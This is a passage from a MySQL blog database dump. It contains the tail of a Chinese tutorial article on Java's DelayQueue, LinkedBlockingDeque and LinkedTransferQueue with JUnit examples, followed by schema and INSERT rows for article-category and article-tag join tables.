DelayQueue的元素必须实现一个*Delay接口*,Delay接口继承了Comparable接口\n4. DelayQueue中的元素都要进行排序,一般情况下都是按照元素过期时间的优先级进行排序;当元素过期的时候可以拿出;比如某个数据5秒需要被处理,某个数据3秒,那么就会按照这种时间顺序排序\n\n#### 示例\n```java\npublic class DelayQueueExample {\n\n    /**\n     * 1. 它使用了{@link PriorityQueue},无边界\n     * 2. 它阻塞的是内部未过期时间元素,不允许插入null值\n     * 3. DelayQueue的元素必须实现一个*Delay接口*,Delay接口继承了Comparable接口\n     * 4. DelayQueue中的元素都要进行排序,一般情况下都是按照元素过期时间的优先级进行排序\n     * 当元素过期的时候可以拿出;比如某个数据5秒需要被处理,某个数据3秒,那么就会按照这种时间顺序排序\n     * 1. The delay queue will ordered by expired time? yes\n     *      延迟队列将按过期时间排序吗？ yes\n     * 2. When poll the empty delay queue will return null?use take? yes\n     *      轮询时，空延迟队列将返回null? yes\n     * 3. When less the expire time will return quickly? yes\n     *      到了到期时间将很快返回? take将等待,poll/remove将返回null yes\n     * 4. Event though unexpired element cannot be removed using {@code take} or {@code poll}？ (take will waiting, but poll not)\n     *      无法使用{@code take}或{@code poll}删除未过期元素的事件  （take将等待结束删除,poll不会删除）\n     * 5. This queue does not permit null elements? yes\n     *      此队列不允许空元素? yes\n     * 6. Use iterator can return quickly? yes\n     *      使用迭代器可以快速返回吗 yes\n     * NOTICE: The DelayQueue elements must implement the {@link java.util.concurrent.Delayed}\n     *          The DelayQueue is a unbounded queue.\n     * @param <T>\n     * @return\n     */\n    public static <T extends Delayed> DelayQueue<T> create() {\n        return new DelayQueue<>(); // size边界,与数组一样\n    }\n}\npublic class DelayQueueExampleTest {\n\n    private DelayQueueExample delayQueueExample;\n\n    /**\n     * 不允许插入空元素\n     * @throws InterruptedException\n     */\n    @Test\n    public void testNullValue() throws InterruptedException {\n        DelayQueue<DelayElement<String>> delayQueue = DelayQueueExample.create();\n        try {\n            delayQueue.add(null);\n            fail(\"should not process to here.\");\n        } catch (Exception e) {\n            assertThat(e instanceof NullPointerException, equalTo(true));\n        }\n    }\n\n    /**\n     * DelayQueue的元素必须实现一个Delay接口\n     * {@link DelayQueue#add(Delayed)} add方法必须添加Delayed元素,实际add方法调用offer方法\n     * {@link DelayQueue#peek()} peek方法将快速返回null / element（但不会移除）\n     */\n    @Test\n    public void testAdd() throws InterruptedException {\n        DelayQueue<DelayElement<String>> delayQueue = DelayQueueExample.create();\n        DelayElement<String> delayed1 = DelayElement.of(\"Delayed1\", 1000);\n        delayQueue.add(delayed1); // add方法必须添加Delayed元素,实际调用offer方法\n        assertThat(delayQueue.size(), equalTo(1));\n        long startTime = System.currentTimeMillis();\n        // delayQueue.take(); // take将会延迟等待元素过期时间,并删除\n        assertThat(delayQueue.peek(), is(delayed1)); // peek会立即返回元素,不会删除,不会延时等待元素过期时间\n        System.out.println(System.currentTimeMillis() - startTime);\n    }\n\n    /**\n     * 通过迭代器方式获取元素不会延时等待元素过期时间\n     * {@link DelayQueue#iterator()}\n     * @throws InterruptedException\n     */\n    @Test\n    public void testIterator() throws InterruptedException {\n        DelayQueue<DelayElement<String>> delayQueue = DelayQueueExample.create();\n\n        delayQueue.add(DelayElement.of(\"Delayed1\", 1000));\n        delayQueue.add(DelayElement.of(\"Delayed2\", 800));\n        delayQueue.add(DelayElement.of(\"Delayed3\", 11000));\n        delayQueue.add(DelayElement.of(\"Delayed4\", 20000));\n        assertThat(delayQueue.size(), equalTo(4));\n\n        long startTime = System.currentTimeMillis();\n        Iterator<DelayElement<String>> it = delayQueue.iterator(); // 通过迭代器方式获取元素不会延时等待元素过期时间\n        while (it.hasNext()) {\n            assertThat(it.next(), notNullValue());\n        }\n        System.out.println(System.currentTimeMillis() - startTime);\n        assertThat((System.currentTimeMillis() - startTime) < 5, equalTo(true));\n    }\n\n    /**\n     * poll获取时,若队列中未有过期元素,那么将得到null\n     * @throws InterruptedException\n     */\n    @Test\n    public void testPoll() throws InterruptedException {\n        DelayQueue<DelayElement<String>> delayQueue = DelayQueueExample.create();\n        delayQueue.add(DelayElement.of(\"Delayed1\", 1000));\n        delayQueue.add(DelayElement.of(\"Delayed2\", 800));\n        delayQueue.add(DelayElement.of(\"Delayed3\", 1000));\n        delayQueue.add(DelayElement.of(\"Delayed4\", 2000));\n        assertThat(delayQueue.size(), equalTo(4));\n\n        assertThat(delayQueue.poll(), nullValue()); // 空队列,poll返回null\n    }\n\n    /**\n     * take将阻塞等待获取过期元素\n     * @throws InterruptedException\n     */\n    @Test\n    public void testQuicklyGetExpiredElement() throws InterruptedException {\n        DelayQueue<DelayElement<String>> delayQueue = DelayQueueExample.create();\n        delayQueue.add(DelayElement.of(\"Delayed1\", 100));\n        delayQueue.add(DelayElement.of(\"Delayed2\", 80));\n        delayQueue.add(DelayElement.of(\"Delayed3\", 1000));\n        delayQueue.add(DelayElement.of(\"Delayed4\", 2000));\n        assertThat(delayQueue.take().getData(), equalTo(\"Delayed2\")); // 延迟队列将按过期时间排序的\n        assertThat(delayQueue.take().getData(), equalTo(\"Delayed1\"));\n        assertThat(delayQueue.take().getData(), equalTo(\"Delayed3\"));\n        assertThat(delayQueue.take().getData(), equalTo(\"Delayed4\"));\n    }\n\n    /**\n     * 已过期元素将会被快速返回\n     * @throws InterruptedException\n     */\n    @Test\n    public void testExpiredElement() throws InterruptedException {\n        DelayQueue<DelayElement<String>> delayQueue = DelayQueueExample.create();\n\n        delayQueue.add(DelayElement.of(\"Delayed1\", 100));\n        delayQueue.add(DelayElement.of(\"Delayed2\", 80));\n        delayQueue.add(DelayElement.of(\"Delayed3\", 1000));\n        delayQueue.add(DelayElement.of(\"Delayed4\", 2000));\n        TimeUnit.MILLISECONDS.sleep(90);\n        assertThat(delayQueue.size(), equalTo(4));\n        long currentTime = System.currentTimeMillis();\n        assertThat(delayQueue.take().getData(), equalTo(\"Delayed2\")); //已过期元素将会被快速返回\n        assertThat((System.currentTimeMillis()-currentTime)<=20, equalTo(true));\n    }\n\n    /**\n     * take会进入阻塞等待直到获取过期元素或被打断\n     * @throws InterruptedException\n     */\n    @Test\n    public void testTake() throws InterruptedException {\n        DelayQueue<DelayElement<String>> delayQueue = DelayQueueExample.create();\n        ScheduledExecutorService scheduledExecutorService = Executors.newSingleThreadScheduledExecutor();\n        scheduledExecutorService.schedule(()->delayQueue.add(DelayElement.of(\"Test\", 1000)),1 ,TimeUnit.SECONDS);\n        scheduledExecutorService.shutdown();\n        long startTime = System.currentTimeMillis();\n        assertThat(delayQueue.take().getData(), equalTo(\"Test\")); // take会进入阻塞等待直到获取过期元素或被打断\n        assertThat((System.currentTimeMillis()-startTime)>=1000, equalTo(true));\n    }\n\n    static class DelayElement<E> implements Delayed {\n        private final E e;\n\n        private final long expireTime;\n\n        DelayElement(E e, long delay) {\n            this.e = e;\n            this.expireTime = System.currentTimeMillis() + delay;\n        }\n\n        static <T> DelayElement<T> of(T e, long delay) {\n            return new DelayElement<>(e, delay);\n        }\n\n        @Override\n        public long getDelay(TimeUnit unit) {\n            long diff = expireTime - System.currentTimeMillis();\n            return unit.convert(diff, TimeUnit.MILLISECONDS); // >0阻塞\n        }\n\n        @Override\n        public int compareTo(Delayed delayedObject) {\n            DelayElement that = (DelayElement)delayedObject;\n            if (this.expireTime < that.getExpireTime()) {\n                return -1;\n            } else if(this.expireTime > that.getExpireTime()) {\n                return 1;\n            } else {\n                return 0;\n            }\n        }\n\n        public E getData() {\n            return e;\n        }\n\n        public long getExpireTime() {\n            return expireTime;\n        }\n    }\n}\n```\n#### API\n1. **poll**: poll获取时,若队列中未有过期元素,那么将得到null\n2. **take**: take会进入阻塞等待直到获取过期元素或被打断\n3. **peek**： peek会立即返回元素,不会删除,不会延时等待元素过期时间\n4. **iterator**: 通过迭代器方式获取元素不会延时等待元素过期时间\n\n### LinkedBlockingDeque\n#### 特点\n1. 双向队列,既能从头插入也能从尾插入\n2. 如果初始化时指定了大小,那么它就是有边界的,如果不指定就是无边界\n\n#### 示例\n```java\npublic class LinkedBlockingDequeExample {\n    /**\n     * 1. 双向队列,既能从头插入也能从尾插入\n     * 2. 如果初始化时指定了大小,那么它就是有边界的,如果不指定就是无边界*\n     * Double-End-Queue\n     * @param <T>\n     * @return\n     */\n    public static <T> LinkedBlockingDeque<T> create() {\n        return new LinkedBlockingDeque<>();\n    }\n}\npublic class LinkedBlockingDequeExampleTest {\n    /**\n     * 从头部插入与取出\n     * {@link LinkedBlockingDeque#addFirst(Object)} addFirst从头部插入\n     * {@link LinkedBlockingDeque#removeFirst()} removeFirst从头部取出\n     */\n    @Test\n    public void testAddFirst() {\n        LinkedBlockingDeque<String> deque = LinkedBlockingDequeExample.create();\n        deque.addFirst(\"Java\"); // 双向队列,addFirst从头部插入\n        deque.addFirst(\"Scala\");\n        assertThat(deque.removeFirst(), equalTo(\"Scala\")); // removeFirst从头部取出\n        assertThat(deque.removeFirst(), equalTo(\"Java\"));\n    }\n\n    /**\n     * 从尾部插入与取出\n     * {@link LinkedBlockingDeque#addLast(Object)} addLast从尾部插入\n     * {@link LinkedBlockingDeque#removeLast()} removeLast从尾部取出\n     */\n    @Test\n    public void testAddLast() {\n        LinkedBlockingDeque<String> deque = LinkedBlockingDequeExample.create();\n        deque.addLast(\"Java\"); // 双向队列,addLast从尾部插入\n        deque.addLast(\"Scala\");\n        assertThat(deque.removeLast(), equalTo(\"Scala\")); // removeLast从尾部取出\n        assertThat(deque.removeLast(), equalTo(\"Java\"));\n    }\n\n    /**\n     * takeFirst与takeLast\n     *  队列空时,take会阻塞等待直到获取到元素或线程被中断\n     * {@link }\n     * @throws InterruptedException\n     */\n    @Test\n    public void testTakeFirstAndLast() throws InterruptedException {\n        LinkedBlockingDeque<String> deque = LinkedBlockingDequeExample.create();\n        long currentTime = System.currentTimeMillis();\n        deque.takeFirst(); // 队列空时,take会阻塞等待直到获取到元素或线程被中断\n        // deque.takeLast();\n        assertThat((System.currentTimeMillis()-currentTime)>=1000, equalTo(true));\n    }\n}\n```\n#### API\n1. **addFirst**: addFirst从头部插入\n2. **removeFirst**: removeFirst从头部取出\n3. **addLast**: addLast从尾部插入\n4. **removeLast**: removeLast从尾部取出\n\n### LinkedTransferQueue\n#### 特点\n1. 无边界\n2. 不同与其他队列,该队列生产必须到等到消费者前来消费才算结束\n3. TransferQueue在需要确保消息传递的情况下很有用\n\n#### 示例\n```java\npublic class LinkedTransferQueueExample {\n    /**\n     * 1. 无边界,\n     * 2. 不同与其他队列,该队列生产必须到等到消费者前来消费才算结束\n     * 3. TransferQueue在需要确保消息传递的情况下很有用\n     * unbounded\n     * Producer: when the capacity is full.the producer will blocked.else just only insert the new element into the queue,\n     *  but the data is consume or  not?\n     *  The TransferQueue is useful in scenario where message passing need to guaranteed\n     *      不同与其他队列,该队列生产必须到等到消费者前来消费才算结束\n     * @param <T>\n     * @return\n     */\n    public static <T> LinkedTransferQueue<T> create() {\n        return new LinkedTransferQueue();\n    }\n}\npublic class LinkedTransferQueueExampleTest {\n\n    /**\n     *  tryTransfer不进入阻塞等待,立刻生产,失败将返回false\n     * {@link LinkedTransferQueue#tryTransfer(Object)} 不进入阻塞等待,立刻生产\n     * Transfers the element to a waiting consumer immediately, if possible\n     *  如有可能，立即将元素转移给等待的使用者\n     * Question:\n     * when return the false that means at this time no consumer waiting,how about the element?\n     * will store into the queue?\n     *\n     * Answer:\n     *  Without enqueueing the element\n     */\n    @Test\n    public void testTryTransfer() {\n        LinkedTransferQueue<String> queue = LinkedTransferQueueExample.create();\n        boolean result = queue.tryTransfer(\"Transfer\");\n        assertThat(result, equalTo(false)); // 没有consumer进行消费\n        assertThat(queue.size(), equalTo(0)); // 失败了,没有增加\n    }\n\n    /**\n     * transfer将会一直阻塞等待直到 当有一个消费者在等待消费数据时,会立即结束\n     * 消费者需要通过{@code take}或{@code poll(long, TimeUnit)}来消费\n     * {@link LinkedTransferQueue#transfer(Object)}  transfer将会一直阻塞等待直到,当有一个消费者在等待消费数据时,会立即结束\n     * @throws InterruptedException\n     */\n    @Test\n    public void testTransfer() throws InterruptedException {\n        LinkedTransferQueue<String> queue = LinkedTransferQueueExample.create();\n        ScheduledExecutorService scheduledExecutorService = Executors.newSingleThreadScheduledExecutor();\n        scheduledExecutorService.schedule(()->{\n            try {\n                assertThat(queue.take(), equalTo(\"Transfer\"));\n            } catch (InterruptedException e) {\n                fail();\n            }\n        }, 1, TimeUnit.SECONDS);\n        scheduledExecutorService.shutdown();\n        long currentTime = System.currentTimeMillis();\n        queue.transfer(\"Transfer\"); // transfer将会一直阻塞等待,直到被消费或被中断\n        assertThat(queue.size(), equalTo(0)); // 被消费了,所以是0\n        assertThat((System.currentTimeMillis()-currentTime)>=1000, equalTo(true));\n    }\n\n    /**\n     * getWaitingConsumerCount与hasWaitingConsumer\n     * {@link LinkedTransferQueue#getWaitingConsumerCount} 有几个消费在等待消费\n     * {@link LinkedTransferQueue#hasWaitingConsumer()} 是否存在消费者等待消费\n     * @throws InterruptedException\n     */\n    @Test\n    public void testLinkedTransferQueue() throws InterruptedException {\n        LinkedTransferQueue<String> queue = LinkedTransferQueueExample.create();\n        assertThat(queue.getWaitingConsumerCount(), equalTo(0));\n        assertThat(queue.hasWaitingConsumer(), equalTo(false));\n\n        List<Callable<String>> collect = IntStream.range(0, 5).boxed().map(i -> (Callable<String>) () -> {\n            try {\n                return queue.take();\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }).collect(Collectors.toList());\n\n        ExecutorService executorService = Executors.newCachedThreadPool();\n        collect.stream().forEach(executorService::submit);\n        TimeUnit.MILLISECONDS.sleep(100);\n        assertThat(queue.getWaitingConsumerCount(), equalTo(5)); // 5个消费者正在等待消费\n        assertThat(queue.hasWaitingConsumer(), equalTo(true)); // 存在消费者等待消费\n        System.out.println(\"============================================\");\n\n        IntStream.range(0, 5).boxed().map(String::valueOf).forEach(queue::add); // 生产5个\n        TimeUnit.MILLISECONDS.sleep(100);\n        assertThat(queue.getWaitingConsumerCount(), equalTo(0));\n        assertThat(queue.hasWaitingConsumer(), equalTo(false));\n    }\n\n    /**\n     * add向队列直接添加元素\n     * {@link LinkedTransferQueue#add(Object)} add向队列直接添加元素\n     * @throws InterruptedException\n     */\n    @Test\n    public void testAdd() throws InterruptedException {\n        LinkedTransferQueue<String> queue = LinkedTransferQueueExample.create();\n        assertThat(queue.add(\"Hello\"), equalTo(true));\n        assertThat(queue.size(), equalTo(1));\n    }\n}\n```\n#### API\n1. **tryTransfer**: 不进入阻塞等待,立刻生产,失败将返回false\n2. **transfer**: 将会一直阻塞等待直到,当有一个消费者在等待消费数据时,会立即结束\n3. **add**: 向队列直接添加元素\n4. **getWaitingConsumerCount**: 有几个消费在等待消费\n5. **hasWaitingConsumer**: 是否存在消费者等待消费', 0, 0, 42, 0, 0, '2019-10-19 15:10:24', '2019-10-19 16:33:38', 0, 0);

-- ----------------------------
-- Table structure for article_bind_article_category
-- ----------------------------
DROP TABLE IF EXISTS `article_bind_article_category`;
CREATE TABLE `article_bind_article_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '文章分类关系主键id',
  `article_id` int(0) NOT NULL COMMENT '文章id',
  `article_category_id` int(0) NOT NULL COMMENT '分类id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3008 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '处理分类与文章关系的数据表,文章需要通过该表获得分类信息' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_bind_article_category
-- ----------------------------
INSERT INTO `article_bind_article_category` VALUES (1770, 2, 3);
INSERT INTO `article_bind_article_category` VALUES (1772, 3, 1);
INSERT INTO `article_bind_article_category` VALUES (1774, 5, 3);
INSERT INTO `article_bind_article_category` VALUES (1775, 6, 1);
INSERT INTO `article_bind_article_category` VALUES (1776, 6, 6);
INSERT INTO `article_bind_article_category` VALUES (1777, 7, 1);
INSERT INTO `article_bind_article_category` VALUES (1778, 7, 6);
INSERT INTO `article_bind_article_category` VALUES (1784, 11, 2);
INSERT INTO `article_bind_article_category` VALUES (1785, 11, 5);
INSERT INTO `article_bind_article_category` VALUES (1786, 12, 2);
INSERT INTO `article_bind_article_category` VALUES (1787, 12, 5);
INSERT INTO `article_bind_article_category` VALUES (1788, 13, 1);
INSERT INTO `article_bind_article_category` VALUES (1789, 13, 5);
INSERT INTO `article_bind_article_category` VALUES (1790, 14, 1);
INSERT INTO `article_bind_article_category` VALUES (1791, 14, 5);
INSERT INTO `article_bind_article_category` VALUES (1795, 17, 2);
INSERT INTO `article_bind_article_category` VALUES (1802, 20, 1);
INSERT INTO `article_bind_article_category` VALUES (1803, 20, 5);
INSERT INTO `article_bind_article_category` VALUES (1811, 25, 2);
INSERT INTO `article_bind_article_category` VALUES (1813, 27, 2);
INSERT INTO `article_bind_article_category` VALUES (1814, 27, 5);
INSERT INTO `article_bind_article_category` VALUES (1818, 29, 1);
INSERT INTO `article_bind_article_category` VALUES (1820, 31, 1);
INSERT INTO `article_bind_article_category` VALUES (1821, 31, 5);
INSERT INTO `article_bind_article_category` VALUES (1822, 32, 1);
INSERT INTO `article_bind_article_category` VALUES (1824, 34, 2);
INSERT INTO `article_bind_article_category` VALUES (1825, 35, 2);
INSERT INTO `article_bind_article_category` VALUES (1826, 36, 1);
INSERT INTO `article_bind_article_category` VALUES (1827, 37, 3);
INSERT INTO `article_bind_article_category` VALUES (1828, 38, 2);
INSERT INTO `article_bind_article_category` VALUES (1829, 38, 5);
INSERT INTO `article_bind_article_category` VALUES (1831, 40, 2);
INSERT INTO `article_bind_article_category` VALUES (1834, 43, 1);
INSERT INTO `article_bind_article_category` VALUES (1835, 44, 1);
INSERT INTO `article_bind_article_category` VALUES (1838, 15, 4);
INSERT INTO `article_bind_article_category` VALUES (1841, 30, 3);
INSERT INTO `article_bind_article_category` VALUES (1861, 33, 1);
INSERT INTO `article_bind_article_category` VALUES (1874, 28, 1);
INSERT INTO `article_bind_article_category` VALUES (1875, 28, 5);
INSERT INTO `article_bind_article_category` VALUES (1881, 39, 2);
INSERT INTO `article_bind_article_category` VALUES (1898, 4, 3);
INSERT INTO `article_bind_article_category` VALUES (1901, 45, 1);
INSERT INTO `article_bind_article_category` VALUES (1929, 41, 1);
INSERT INTO `article_bind_article_category` VALUES (1931, 46, 1);
INSERT INTO `article_bind_article_category` VALUES (1955, 48, 8);
INSERT INTO `article_bind_article_category` VALUES (1966, 50, 8);
INSERT INTO `article_bind_article_category` VALUES (2037, 56, 8);
INSERT INTO `article_bind_article_category` VALUES (2060, 52, 8);
INSERT INTO `article_bind_article_category` VALUES (2061, 57, 5);
INSERT INTO `article_bind_article_category` VALUES (2062, 57, 8);
INSERT INTO `article_bind_article_category` VALUES (2084, 49, 8);
INSERT INTO `article_bind_article_category` VALUES (2127, 19, 2);
INSERT INTO `article_bind_article_category` VALUES (2150, 63, 5);
INSERT INTO `article_bind_article_category` VALUES (2151, 63, 8);
INSERT INTO `article_bind_article_category` VALUES (2154, 42, 1);
INSERT INTO `article_bind_article_category` VALUES (2163, 64, 5);
INSERT INTO `article_bind_article_category` VALUES (2164, 64, 8);
INSERT INTO `article_bind_article_category` VALUES (2191, 66, 5);
INSERT INTO `article_bind_article_category` VALUES (2192, 66, 8);
INSERT INTO `article_bind_article_category` VALUES (2195, 21, 1);
INSERT INTO `article_bind_article_category` VALUES (2196, 21, 8);
INSERT INTO `article_bind_article_category` VALUES (2197, 65, 5);
INSERT INTO `article_bind_article_category` VALUES (2198, 65, 8);
INSERT INTO `article_bind_article_category` VALUES (2209, 62, 5);
INSERT INTO `article_bind_article_category` VALUES (2210, 62, 8);
INSERT INTO `article_bind_article_category` VALUES (2211, 61, 5);
INSERT INTO `article_bind_article_category` VALUES (2212, 61, 8);
INSERT INTO `article_bind_article_category` VALUES (2213, 60, 5);
INSERT INTO `article_bind_article_category` VALUES (2214, 60, 8);
INSERT INTO `article_bind_article_category` VALUES (2215, 59, 5);
INSERT INTO `article_bind_article_category` VALUES (2216, 58, 5);
INSERT INTO `article_bind_article_category` VALUES (2217, 55, 5);
INSERT INTO `article_bind_article_category` VALUES (2218, 55, 8);
INSERT INTO `article_bind_article_category` VALUES (2219, 54, 8);
INSERT INTO `article_bind_article_category` VALUES (2220, 53, 8);
INSERT INTO `article_bind_article_category` VALUES (2221, 51, 8);
INSERT INTO `article_bind_article_category` VALUES (2222, 67, 5);
INSERT INTO `article_bind_article_category` VALUES (2223, 67, 8);
INSERT INTO `article_bind_article_category` VALUES (2224, 47, 8);
INSERT INTO `article_bind_article_category` VALUES (2247, 68, 5);
INSERT INTO `article_bind_article_category` VALUES (2248, 68, 8);
INSERT INTO `article_bind_article_category` VALUES (2254, 69, 1);
INSERT INTO `article_bind_article_category` VALUES (2270, 70, 9);
INSERT INTO `article_bind_article_category` VALUES (2298, 72, 1);
INSERT INTO `article_bind_article_category` VALUES (2299, 71, 1);
INSERT INTO `article_bind_article_category` VALUES (2300, 71, 5);
INSERT INTO `article_bind_article_category` VALUES (2310, 73, 1);
INSERT INTO `article_bind_article_category` VALUES (2311, 73, 5);
INSERT INTO `article_bind_article_category` VALUES (2326, 74, 1);
INSERT INTO `article_bind_article_category` VALUES (2327, 74, 5);
INSERT INTO `article_bind_article_category` VALUES (2364, 75, 1);
INSERT INTO `article_bind_article_category` VALUES (2365, 75, 5);
INSERT INTO `article_bind_article_category` VALUES (2374, 76, 2);
INSERT INTO `article_bind_article_category` VALUES (2375, 76, 5);
INSERT INTO `article_bind_article_category` VALUES (2381, 18, 1);
INSERT INTO `article_bind_article_category` VALUES (2382, 18, 5);
INSERT INTO `article_bind_article_category` VALUES (2409, 78, 1);
INSERT INTO `article_bind_article_category` VALUES (2410, 78, 5);
INSERT INTO `article_bind_article_category` VALUES (2413, 10, 3);
INSERT INTO `article_bind_article_category` VALUES (2430, 77, 1);
INSERT INTO `article_bind_article_category` VALUES (2440, 79, 1);
INSERT INTO `article_bind_article_category` VALUES (2465, 81, 1);
INSERT INTO `article_bind_article_category` VALUES (2485, 8, 1);
INSERT INTO `article_bind_article_category` VALUES (2486, 8, 5);
INSERT INTO `article_bind_article_category` VALUES (2508, 82, 1);
INSERT INTO `article_bind_article_category` VALUES (2531, 85, 1);
INSERT INTO `article_bind_article_category` VALUES (2536, 84, 1);
INSERT INTO `article_bind_article_category` VALUES (2553, 83, 1);
INSERT INTO `article_bind_article_category` VALUES (2556, 86, 1);
INSERT INTO `article_bind_article_category` VALUES (2584, 87, 1);
INSERT INTO `article_bind_article_category` VALUES (2595, 24, 2);
INSERT INTO `article_bind_article_category` VALUES (2606, 90, 3);
INSERT INTO `article_bind_article_category` VALUES (2608, 22, 2);
INSERT INTO `article_bind_article_category` VALUES (2613, 23, 1);
INSERT INTO `article_bind_article_category` VALUES (2614, 88, 1);
INSERT INTO `article_bind_article_category` VALUES (2615, 89, 3);
INSERT INTO `article_bind_article_category` VALUES (2637, 91, 3);
INSERT INTO `article_bind_article_category` VALUES (2638, 92, 3);
INSERT INTO `article_bind_article_category` VALUES (2640, 94, 3);
INSERT INTO `article_bind_article_category` VALUES (2643, 95, 3);
INSERT INTO `article_bind_article_category` VALUES (2646, 96, 3);
INSERT INTO `article_bind_article_category` VALUES (2655, 97, 3);
INSERT INTO `article_bind_article_category` VALUES (2658, 98, 3);
INSERT INTO `article_bind_article_category` VALUES (2661, 99, 3);
INSERT INTO `article_bind_article_category` VALUES (2663, 93, 3);
INSERT INTO `article_bind_article_category` VALUES (2667, 100, 3);
INSERT INTO `article_bind_article_category` VALUES (2669, 101, 3);
INSERT INTO `article_bind_article_category` VALUES (2675, 102, 3);
INSERT INTO `article_bind_article_category` VALUES (2682, 103, 3);
INSERT INTO `article_bind_article_category` VALUES (2695, 104, 3);
INSERT INTO `article_bind_article_category` VALUES (2730, 105, 1);
INSERT INTO `article_bind_article_category` VALUES (2731, 105, 5);
INSERT INTO `article_bind_article_category` VALUES (2778, 106, 1);
INSERT INTO `article_bind_article_category` VALUES (2779, 106, 5);
INSERT INTO `article_bind_article_category` VALUES (2802, 108, 3);
INSERT INTO `article_bind_article_category` VALUES (2803, 108, 5);
INSERT INTO `article_bind_article_category` VALUES (2820, 109, 1);
INSERT INTO `article_bind_article_category` VALUES (2834, 110, 1);
INSERT INTO `article_bind_article_category` VALUES (2907, 117, 1);
INSERT INTO `article_bind_article_category` VALUES (2908, 116, 1);
INSERT INTO `article_bind_article_category` VALUES (2909, 115, 1);
INSERT INTO `article_bind_article_category` VALUES (2910, 114, 1);
INSERT INTO `article_bind_article_category` VALUES (2911, 113, 1);
INSERT INTO `article_bind_article_category` VALUES (2912, 112, 1);
INSERT INTO `article_bind_article_category` VALUES (2913, 111, 1);
INSERT INTO `article_bind_article_category` VALUES (2914, 9, 3);
INSERT INTO `article_bind_article_category` VALUES (2915, 107, 3);
INSERT INTO `article_bind_article_category` VALUES (2916, 107, 5);
INSERT INTO `article_bind_article_category` VALUES (2921, 26, 1);
INSERT INTO `article_bind_article_category` VALUES (2922, 80, 1);
INSERT INTO `article_bind_article_category` VALUES (2930, 118, 1);
INSERT INTO `article_bind_article_category` VALUES (2949, 119, 1);
INSERT INTO `article_bind_article_category` VALUES (2958, 120, 1);
INSERT INTO `article_bind_article_category` VALUES (2986, 121, 1);
INSERT INTO `article_bind_article_category` VALUES (3000, 122, 1);
INSERT INTO `article_bind_article_category` VALUES (3006, 1, 4);
INSERT INTO `article_bind_article_category` VALUES (3007, 16, 4);

-- ----------------------------
-- Table structure for article_bind_article_tag
-- ----------------------------
DROP TABLE IF EXISTS `article_bind_article_tag`;
CREATE TABLE `article_bind_article_tag`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '文章与文章标签绑定的id',
  `article_tag_id` int(0) NOT NULL COMMENT '文章标签的id',
  `article_id` int(0) NOT NULL COMMENT '文章的id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1415 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_bind_article_tag
-- ----------------------------
INSERT INTO `article_bind_article_tag` VALUES (2, 7, 2);
INSERT INTO `article_bind_article_tag` VALUES (4, 8, 3);
INSERT INTO `article_bind_article_tag` VALUES (6, 10, 5);
INSERT INTO `article_bind_article_tag` VALUES (7, 2, 6);
INSERT INTO `article_bind_article_tag` VALUES (8, 2, 7);
INSERT INTO `article_bind_article_tag` VALUES (13, 1, 11);
INSERT INTO `article_bind_article_tag` VALUES (14, 10, 11);
INSERT INTO `article_bind_article_tag` VALUES (15, 1, 12);
INSERT INTO `article_bind_article_tag` VALUES (16, 10, 12);
INSERT INTO `article_bind_article_tag` VALUES (17, 1, 13);
INSERT INTO `article_bind_article_tag` VALUES (18, 1, 14);
INSERT INTO `article_bind_article_tag` VALUES (22, 12, 17);
INSERT INTO `article_bind_article_tag` VALUES (28, 3, 20);
INSERT INTO `article_bind_article_tag` VALUES (39, 1, 25);
INSERT INTO `article_bind_article_tag` VALUES (40, 10, 25);
INSERT INTO `article_bind_article_tag` VALUES (41, 15, 25);
INSERT INTO `article_bind_article_tag` VALUES (45, 3, 27);
INSERT INTO `article_bind_article_tag` VALUES (46, 10, 27);
INSERT INTO `article_bind_article_tag` VALUES (49, 17, 29);
INSERT INTO `article_bind_article_tag` VALUES (51, 3, 31);
INSERT INTO `article_bind_article_tag` VALUES (52, 17, 32);
INSERT INTO `article_bind_article_tag` VALUES (56, 16, 34);
INSERT INTO `article_bind_article_tag` VALUES (57, 16, 35);
INSERT INTO `article_bind_article_tag` VALUES (58, 8, 36);
INSERT INTO `article_bind_article_tag` VALUES (59, 9, 37);
INSERT INTO `article_bind_article_tag` VALUES (60, 3, 38);
INSERT INTO `article_bind_article_tag` VALUES (62, 16, 40);
INSERT INTO `article_bind_article_tag` VALUES (66, 4, 43);
INSERT INTO `article_bind_article_tag` VALUES (67, 4, 44);
INSERT INTO `article_bind_article_tag` VALUES (70, 6, 15);
INSERT INTO `article_bind_article_tag` VALUES (77, 8, 30);
INSERT INTO `article_bind_article_tag` VALUES (99, 3, 33);
INSERT INTO `article_bind_article_tag` VALUES (100, 10, 33);
INSERT INTO `article_bind_article_tag` VALUES (101, 13, 33);
INSERT INTO `article_bind_article_tag` VALUES (111, 16, 28);
INSERT INTO `article_bind_article_tag` VALUES (121, 16, 39);
INSERT INTO `article_bind_article_tag` VALUES (122, 10, 39);
INSERT INTO `article_bind_article_tag` VALUES (152, 9, 4);
INSERT INTO `article_bind_article_tag` VALUES (157, 16, 45);
INSERT INTO `article_bind_article_tag` VALUES (158, 3, 45);
INSERT INTO `article_bind_article_tag` VALUES (195, 5, 41);
INSERT INTO `article_bind_article_tag` VALUES (198, 16, 46);
INSERT INTO `article_bind_article_tag` VALUES (199, 10, 46);
INSERT INTO `article_bind_article_tag` VALUES (223, 14, 48);
INSERT INTO `article_bind_article_tag` VALUES (234, 14, 50);
INSERT INTO `article_bind_article_tag` VALUES (314, 14, 56);
INSERT INTO `article_bind_article_tag` VALUES (343, 16, 52);
INSERT INTO `article_bind_article_tag` VALUES (344, 18, 52);
INSERT INTO `article_bind_article_tag` VALUES (345, 3, 52);
INSERT INTO `article_bind_article_tag` VALUES (346, 18, 57);
INSERT INTO `article_bind_article_tag` VALUES (347, 13, 57);
INSERT INTO `article_bind_article_tag` VALUES (369, 14, 49);
INSERT INTO `article_bind_article_tag` VALUES (411, 13, 19);
INSERT INTO `article_bind_article_tag` VALUES (423, 5, 63);
INSERT INTO `article_bind_article_tag` VALUES (424, 14, 63);
